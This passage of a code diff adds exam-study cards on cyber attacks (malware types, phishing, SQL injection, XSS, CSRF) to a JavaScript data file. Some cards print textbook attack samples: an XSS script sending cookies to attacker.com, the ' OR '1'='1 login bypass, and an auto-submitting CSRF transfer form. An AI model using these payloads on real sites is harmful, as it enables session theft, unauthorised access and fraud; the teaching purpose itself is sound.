network.",
+    note:
+      "Exam favourite: TLS combines both encryption approaches — asymmetric encryption briefly during the handshake (to securely agree on a key), then symmetric encryption for the actual bulk data transfer (for speed). Also remember: SSL is obsolete; TLS is the modern standard actually in use today.",
+    diagram:
+      "  TLS HANDSHAKE — asymmetric to agree on a key, symmetric after that\n\n  Client                                     Server\n    │──── Hello, here's what I support ──────►│\n    │◄─── Certificate (proves identity) ───────│\n    │──(verify cert, agree on session key,     │\n    │   using asymmetric encryption briefly)──►│\n    │◄════ fast SYMMETRIC encrypted data ═════►│  ← the actual web traffic",
+    tags: ["SSL", "TLS", "Security Technologies", "TLS Handshake", "Digital Certificate"],
+  },
+  {
+    id: 327,
+    slug: "attacks",
+    section: "Cyber Security",
+    title: "Attacks",
+    tagline: "The most common ways systems and users actually get compromised — malware, phishing, and web-based attacks",
+    description:
+      "<b>What This Covers</b>\nAttacks covers the specific, most commonly tested threats that everything else in this section exists to defend against — malicious software that infects systems, social engineering that tricks people directly, and attacks that exploit weaknesses in how web applications are built.\n\n<b>What You'll Learn Here</b>\n• <b>Malware</b> — malicious software, covering three common types: Virus, Worm, and Trojan\n• <b>Phishing</b> — tricking a person (not a system) into revealing sensitive information or taking a harmful action\n• <b>SQL Injection</b> — injecting malicious database commands through an application's input fields\n• <b>XSS (Cross-Site Scripting)</b> — injecting malicious scripts into a trusted website that then run in other users' browsers\n• <b>CSRF (Cross-Site Request Forgery)</b> — tricking an already-logged-in user's browser into submitting an unwanted request\n  ↳ Notice the pattern: Malware directly infects a system, Phishing directly tricks a person, and SQL Injection/XSS/CSRF each exploit a specific weakness in how a web application handles untrusted input.",
+    note:
+      "Exam favourite: sort every attack into one of three buckets — attacks against a system (Malware), attacks against a person (Phishing), and attacks against a web application's handling of input (SQL Injection, XSS, CSRF) — this framing makes the whole chapter far easier to organize in your head.",
+    diagram:
+      "  ATTACKS — three broad categories\n\n  Against a SYSTEM:        Malware → Virus, Worm, Trojan\n  Against a PERSON:         Phishing\n  Against a WEB APPLICATION: SQL Injection, XSS, CSRF",
+    tags: ["Attacks", "Malware", "Phishing", "SQL Injection", "XSS", "CSRF"],
+  },
+  {
+    id: 328,
+    slug: "malware",
+    section: "Cyber Security",
+    parentSlug: "attacks",
+    title: "Malware",
+    tagline: "Malicious software designed to damage, disrupt, or gain unauthorized access to a system",
+    description:
+      "<b>What Malware Is, in Plain English</b>\nMalware (short for 'malicious software') is any software deliberately designed to harm a system, steal data, or gain unauthorized access — it's a broad umbrella term covering many different types of malicious programs, three of which are covered in depth next.\n\n<b>What You'll Learn Here</b>\n• <b>Virus</b> — malicious code that attaches itself to a legitimate file or program, and needs a human to run that infected file to activate and spread\n• <b>Worm</b> — a standalone malicious program that self-replicates and spreads across a network entirely on its own, with no user action required\n• <b>Trojan</b> — malware disguised as legitimate, desirable software, tricking a user into installing it themselves\n  ↳ Each is covered in full in its own card next, distinguished primarily by how it spreads and whether it needs a human to help it along.\n\n<b>The Key Distinguishing Question</b>\nFor all three types, the fastest way to tell them apart on an exam is to ask: does it need to attach to something (Virus), does it spread on its own across a network (Worm), or does it rely on tricking the user into installing it directly (Trojan)?",
+    note:
+      "Exam favourite: Virus needs a host file and a human action to run it; Worm spreads entirely on its own across a network with no user action needed; Trojan relies on deception to get a user to install it voluntarily. Mixing these three up is one of the most common mistakes on this topic.",
+    diagram:
+      "  MALWARE TYPES — how each one spreads\n\n  Virus   → attaches to a file, spreads when a HUMAN runs the infected file\n  Worm    → spreads across a NETWORK entirely on its own, no human needed\n  Trojan  → disguised as something desirable, human installs it VOLUNTARILY",
+    tags: ["Malware", "Attacks", "Virus", "Worm", "Trojan"],
+  },
+  {
+    id: 329,
+    slug: "virus",
+    section: "Cyber Security",
+    parentSlug: "malware",
+    title: "Virus",
+    tagline: "Malicious code that attaches to a legitimate file and needs a human to run it before it can spread",
+    description:
+      "<b>What a Virus Is, in Plain English</b>\nA computer virus is malicious code that attaches itself to a legitimate file or program (its 'host'), and only activates and spreads when a human actually runs that infected host file — a virus cannot spread or do anything on its own; it always needs some user action to trigger it.\n\n<b>How a Virus Spreads</b>\n1. A virus attaches itself to a legitimate file (e.g. an executable program, or a document with macros)\n2. A user runs or opens that infected file, unknowingly activating the virus\n3. Once active, the virus can attach itself to other files on the same system, and potentially spread further if the user shares an infected file with someone else (e.g. via email or a USB drive)\n\n<b>Why the 'Host File + Human Action' Requirement Matters</b>\nThis is exactly what separates a virus from a worm — a worm needs neither a host file to attach to, nor a human to trigger it; it spreads entirely on its own across a network. A virus, by definition, always depends on both.\n\n<b>Real-World Example</b>\nA malicious macro embedded inside a Word document that only activates and starts spreading once a user opens the document and enables macros — the virus needed both a host (the document) and a human action (opening it, enabling macros) to do anything at all.",
+    note:
+      "Exam favourite: a virus REQUIRES a host file to attach to AND a human action to run it — no host, no human trigger, means no virus infection. This is the exact detail that distinguishes it from a worm.",
+    diagram:
+      "  VIRUS — needs a host file AND a human action\n\n  Malicious code attaches to a legitimate file (the host)\n         │\n         ▼\n  Human opens/runs the infected host file  ← REQUIRED step\n         │\n         ▼\n  Virus activates, may attach to other files on the system",
+    tags: ["Virus", "Malware", "Attacks", "Host File"],
+  },
+  {
+    id: 330,
+    slug: "worm",
+    section: "Cyber Security",
+    parentSlug: "malware",
+    title: "Worm",
+    tagline: "A standalone malicious program that self-replicates and spreads across a network entirely on its own",
+    description:
+      "<b>What a Worm Is, in Plain English</b>\nA computer worm is a standalone malicious program that self-replicates and spreads across a network completely on its own, with no host file to attach to and no human action required to trigger it — unlike a virus, a worm doesn't need anyone to open or run anything to keep spreading.\n\n<b>How a Worm Spreads</b>\n1. A worm exploits a vulnerability in a networked system (e.g. an unpatched security flaw in an operating system or network service) to gain access\n2. Once inside, it copies itself and immediately uses the same vulnerability to spread to other reachable, vulnerable systems on the network\n3. This process repeats automatically, letting a worm spread extremely quickly across an entire network, or even across the internet, with no human involvement at any point after the initial infection\n\n<b>Why Worms Can Spread So Much Faster Than Viruses</b>\nSince a worm requires no host file and no human action, its spread is limited only by how many vulnerable, reachable systems exist on a network — this is exactly why historic worm outbreaks were able to infect enormous numbers of systems within hours, far faster than a virus (which depends on a human opening an infected file) typically could.\n\n<b>Real-World Example</b>\nA worm that scans a network for computers running an outdated, unpatched piece of software with a known vulnerability, automatically breaks in through that vulnerability, and immediately starts scanning for its next victim, entirely without any user ever clicking or opening anything.",
+    note:
+      "Exam favourite: a worm is standalone (no host file needed) and self-propagating (no human action needed) — it exploits network vulnerabilities directly, which is exactly why worms can spread far faster than viruses.",
+    diagram:
+      "  WORM — spreads on its own across a network\n\n  Worm exploits a network vulnerability on System A\n         │\n         ▼\n  Copies itself to System B, System C, System D... (automatically)\n         │\n         ▼\n  Each newly infected system immediately starts scanning for MORE victims\n\n  No host file needed. No human action needed at any point.",
+    tags: ["Worm", "Malware", "Attacks", "Self-Replicating", "Network Vulnerability"],
+  },
+  {
+    id: 331,
+    slug: "trojan",
+    section: "Cyber Security",
+    parentSlug: "malware",
+    title: "Trojan",
+    tagline: "Malware disguised as legitimate, desirable software, tricking the user into installing it voluntarily",
+    description:
+      "<b>What a Trojan Is, in Plain English</b>\nA Trojan (short for 'Trojan horse,' named after the ancient Greek story of the deceptive wooden horse) is malware disguised as something legitimate or desirable — a free game, a useful-looking tool, a fake software update — so that the user is tricked into installing it themselves, believing it to be safe or beneficial.\n\n<b>How a Trojan Spreads — Deception, Not Self-Replication</b>\nUnlike a virus or a worm, a Trojan does not self-replicate or spread on its own at all — it relies entirely on deceiving a human into voluntarily downloading and running it, believing it's something else entirely. Once installed, it can do whatever its malicious payload was designed for: steal data, open a hidden backdoor for an attacker to access the system remotely, or install further malware.\n\n<b>Trojan vs. Virus vs. Worm — The Full Contrast</b>\n• <b>Virus</b> — attaches to a host file, needs a human to run the infected host\n• <b>Worm</b> — standalone, self-replicates across a network with no human action needed at all\n• <b>Trojan</b> — disguised as something desirable, relies purely on tricking a human into installing it directly, but does not self-replicate once installed\n\n<b>Real-World Example</b>\nA program advertised online as a free, cracked version of expensive paid software, which a user downloads and runs willingly, not realizing it secretly installs a backdoor that lets an attacker access their computer remotely afterward.",
+    note:
+      "Exam favourite: a Trojan relies on DECEPTION to get installed, and unlike a virus or worm, it does not self-replicate on its own once it's on a system. If a scenario describes malware disguised as something desirable that the user willingly downloaded, that's a Trojan.",
+    diagram:
+      "  TROJAN — deception, not self-replication\n\n  Malware disguised as: \"Free Game.exe\" / \"Software Update\"\n         │\n         ▼\n  User voluntarily downloads and runs it, believing it's legitimate\n         │\n         ▼\n  Malicious payload activates: steals data / opens a backdoor / installs more malware\n\n  (Does NOT self-replicate or spread on its own once installed.)",
+    tags: ["Trojan", "Malware", "Attacks", "Backdoor", "Social Engineering"],
+  },
+  {
+    id: 332,
+    slug: "phishing",
+    section: "Cyber Security",
+    parentSlug: "attacks",
+    title: "Phishing",
+    tagline: "Tricking a person into revealing sensitive information or taking a harmful action, by impersonating someone trusted",
+    description:
+      "<b>What Phishing Is, in Plain English</b>\nPhishing is a social engineering attack that tricks a person — not a system — into revealing sensitive information (like a password or credit card number) or taking a harmful action (like clicking a malicious link), typically by impersonating a trusted entity such as a bank, a well-known company, or even a coworker.\n\n<b>Why Phishing Targets People, Not Systems</b>\nNo matter how strong a system's technical defenses are (firewalls, encryption, IDS/IPS), phishing bypasses all of them by targeting human trust and attention directly — a convincing fake email asking someone to 'verify their account' can succeed even against a perfectly secured system, simply because a person was fooled into handing over their own credentials.\n\n<b>Common Forms of Phishing</b>\n• <b>Email phishing</b> — a fake email, made to look like it's from a trusted sender (a bank, a well-known service), asking the recipient to click a link and 'log in' on a fake website designed to steal their credentials\n• <b>Spear phishing</b> — a more targeted, personalized version aimed at one specific individual or organization, often using real details about the target to appear more convincing\n• <b>Smishing / Vishing</b> — the same technique carried out over SMS text messages (smishing) or phone calls (vishing) instead of email\n\n<b>How to Recognize and Defend Against It</b>\n• Checking the actual sender address and any links carefully, rather than trusting a display name alone\n• Being suspicious of urgent, pressuring language ('your account will be suspended in 24 hours!'), a common phishing tactic designed to short-circuit careful thinking\n• Never entering credentials on a page reached by clicking a link in an unsolicited message — navigating directly to the real site instead",
+    note:
+      "Exam favourite: phishing is a social engineering attack targeting a HUMAN, not a technical system vulnerability — it's the classic example examiners use to illustrate that even a technically secure system can be compromised if a person is tricked into handing over access.",
+    diagram:
+      "  PHISHING — targets the person, not the system\n\n  Attacker sends fake email: \"Your bank account is locked — click here to verify\"\n         │\n         ▼\n  Victim clicks the link → lands on a FAKE login page (looks identical to the real one)\n         │\n         ▼\n  Victim enters real username/password → attacker now has the victim's actual credentials",
+    tags: ["Phishing", "Attacks", "Social Engineering", "Spear Phishing"],
+  },
+  {
+    id: 333,
+    slug: "sql-injection",
+    section: "Cyber Security",
+    parentSlug: "attacks",
+    title: "SQL Injection",
+    tagline: "Injecting malicious SQL code through an application's input fields to manipulate its database",
+    description:
+      "<b>What SQL Injection Is, in Plain English</b>\nSQL Injection is an attack where malicious SQL code is inserted into an application's input field (like a login form's username box), and that input is carelessly inserted directly into a database query without being properly checked or escaped — tricking the database into running commands the developer never intended.\n\n<b>How It Works — A Classic Example</b>\nImagine a login form that builds its database query by directly gluing the entered username straight into a SQL string:\n`SELECT * FROM users WHERE username = '` + enteredUsername + `'`\n\nIf an attacker enters `' OR '1'='1` as the username, the resulting query becomes:\n`SELECT * FROM users WHERE username = '' OR '1'='1'`\n\nSince `'1'='1'` is always true, this query matches every single row in the users table, potentially letting the attacker log in as the very first user in the database (often an administrator) without ever knowing a real password.\n\n<b>Why This Happens</b>\nThe root cause is trusting user input by inserting it directly into a query as if it were part of the trusted SQL code itself, instead of treating it purely as data.\n\n<b>How to Prevent It</b>\n• <b>Parameterized queries (prepared statements)</b> — the correct fix; user input is always treated strictly as data, never as part of the executable SQL command itself, no matter what characters it contains\n• <b>Input validation</b> — rejecting or sanitizing input that doesn't match an expected format\n• <b>Least privilege</b> — giving a database account used by an application only the minimum permissions it actually needs, limiting the damage even if an injection does succeed",
+    note:
+      "Exam favourite: `' OR '1'='1` is the single most iconic SQL Injection example — know exactly why it works (it turns the WHERE clause into something always true) and know that parameterized queries, not manual string escaping, are the correct fix.",
+    diagram:
+      "  SQL INJECTION — user input becomes part of the query itself\n\n  Intended query:\n  SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'\n\n  Attacker enters username: ' OR '1'='1\n  Resulting query:\n  SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'\n                                          └── always TRUE, matches every row ──┘",
+    code:
+      "// VULNERABLE — user input glued directly into the SQL string\nconst query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\n\n// SAFE — parameterized query, input is always treated as pure data\nconst query = \"SELECT * FROM users WHERE username = ?\";\ndb.execute(query, [username]);   // the '?' can never become executable SQL",
+    codeLanguage: "JavaScript",
+    tags: ["SQL Injection", "Attacks", "Parameterized Queries", "Database Security"],
+  },
+  {
+    id: 334,
+    slug: "xss",
+    section: "Cyber Security",
+    parentSlug: "attacks",
+    title: "XSS (Cross-Site Scripting)",
+    tagline: "Injecting malicious scripts into a trusted website so they run in other unsuspecting users' browsers",
+    description:
+      "<b>What XSS Is, in Plain English</b>\nCross-Site Scripting (XSS) is an attack where malicious JavaScript is injected into a trusted website, so that the script ends up running inside other users' browsers when they visit that site — the browser trusts the script because it appears to come from the legitimate site itself, even though the site unknowingly hosted attacker-controlled code.\n\n<b>How It Works — A Comment Field Example</b>\nImagine a website that lets users post comments, and displays those comments back to every other visitor exactly as they were typed, with no filtering. An attacker posts a comment containing: `<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>`\nWhen any other user views that comment, their own browser executes that script as if it were part of the trusted site, silently sending their own session cookie to the attacker — potentially letting the attacker hijack that user's logged-in session.\n\n<b>Three Types of XSS</b>\n• <b>Stored XSS</b> — the malicious script is permanently saved on the server (e.g. in a database, as in the comment example above) and served to every visitor who views that content\n• <b>Reflected XSS</b> — the malicious script is embedded in a crafted URL, and only reflected back and executed for the one victim who's tricked into clicking that specific link\n• <b>DOM-based XSS</b> — the malicious script never touches the server at all; it's injected and executed purely through client-side JavaScript that unsafely handles data already in the page\n\n<b>How to Prevent It</b>\n• <b>Output encoding</b> — treating any user-supplied content as plain text when displaying it, rather than allowing it to be interpreted as executable HTML/JavaScript\n• <b>Content Security Policy (CSP)</b> — a browser-enforced policy that restricts which scripts are allowed to run on a page at all, limiting the damage even if malicious script does get injected",
+    note:
+      "Exam favourite: know the three types by where the malicious script actually lives — Stored (saved on the server, hits every visitor), Reflected (embedded in a URL, hits only whoever clicks that specific link), DOM-based (never touches the server at all, purely client-side).",
+    diagram:
+      "  XSS (STORED) — malicious script served to every visitor\n\n  Attacker posts a comment: <script>steal(document.cookie)</script>\n         │\n         ▼\n  Comment is stored on the server, unfiltered\n         │\n         ▼\n  Every OTHER user who views the comment page has their browser\n  execute the script — as if it were part of the trusted site",
+    code:
+      "// VULNERABLE — inserting user content directly as HTML\nelement.innerHTML = userComment;  // if userComment contains <script>, it runs\n\n// SAFE — treat user content strictly as text, never as HTML\nelement.textContent = userComment;  // <script> tags are shown as plain text, not executed",
+    codeLanguage: "JavaScript",
+    tags: ["XSS", "Cross-Site Scripting", "Attacks", "Stored XSS", "Reflected XSS", "Content Security Policy"],
+  },
+  {
+    id: 335,
+    slug: "csrf",
+    section: "Cyber Security",
+    parentSlug: "attacks",
+    title: "CSRF (Cross-Site Request Forgery)",
+    tagline: "Tricking an already-logged-in user's browser into submitting an unwanted request on the attacker's behalf",
+    description:
+      "<b>What CSRF Is, in Plain English</b>\nCross-Site Request Forgery (CSRF) tricks a victim's browser into unknowingly submitting a request to a website the victim happens to already be logged into — exploiting the fact that browsers automatically attach a site's cookies (including session cookies) to every request sent to that site, regardless of which page actually triggered the request.\n\n<b>How It Works — A Worked Example</b>\n1. A victim logs into their bank's website, and the bank sets a session cookie in their browser\n2. Without logging out, the victim visits a completely unrelated, malicious website\n3. That malicious page contains hidden code that automatically submits a request to the bank's 'transfer money' endpoint (e.g. via a hidden auto-submitting form)\n4. Because the victim's browser automatically attaches their bank's session cookie to this request (since it's going to the bank's own domain), the bank's server sees what looks like a perfectly legitimate, authenticated request from the logged-in victim, and processes the transfer\n\n<b>Why This Works — The Root Cause</b>\nThe bank's server has no way to tell whether the request genuinely came from its own trusted page, or was silently triggered by some other unrelated website — cookies are attached automatically by the browser regardless of the request's true origin.\n\n<b>How to Prevent It</b>\n• <b>CSRF tokens</b> — the correct, standard fix; the server embeds a unique, secret token in its own legitimate forms, and only accepts a request if that exact token is included — a malicious third-party site has no way to know or guess this token\n• <b>SameSite cookies</b> — a cookie attribute that tells the browser not to send a cookie along with requests originating from a different site, directly blocking the exact mechanism CSRF depends on",
+    note:
+      "Exam favourite: CSRF exploits the browser's automatic cookie-attaching behavior — the victim IS genuinely logged in (unlike phishing, where credentials are stolen directly), but tricked into having their browser submit a request they never intended. CSRF tokens and SameSite cookies are the two standard defenses to know.",
+    diagram:
+      "  CSRF — the victim's own logged-in browser is used against them\n\n  1. Victim logs into bank.com → browser gets a session cookie\n  2. Victim (still logged in) visits evil-site.com\n  3. evil-site.com auto-submits a hidden form to bank.com/transfer\n  4. Browser automatically attaches bank.com's session cookie to that request\n  5. bank.com sees an authenticated-looking request → processes the transfer",
+    code:
+      "<!-- The malicious page's hidden, auto-submitting form -->\n<form action=\"https://bank.com/transfer\" method=\"POST\" id=\"csrf-form\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker-account\">\n  <input type=\"hidden\" name=\"amount\" value=\"5000\">\n</form>\n<script>document.getElementById(\"csrf-form\").submit();</script>\n\n<!-- Defense: the real bank.com form includes a secret CSRF token\n     the attacker's page has no way to know or guess -->\n<input type=\"hidden\" name=\"csrf_token\" value=\"9f8a3b7c...\">",
+    codeLanguage: "HTML",
+    tags: ["CSRF", "Attacks", "CSRF Token", "SameSite Cookies", "Session Hijacking"],
   },
 ];
 
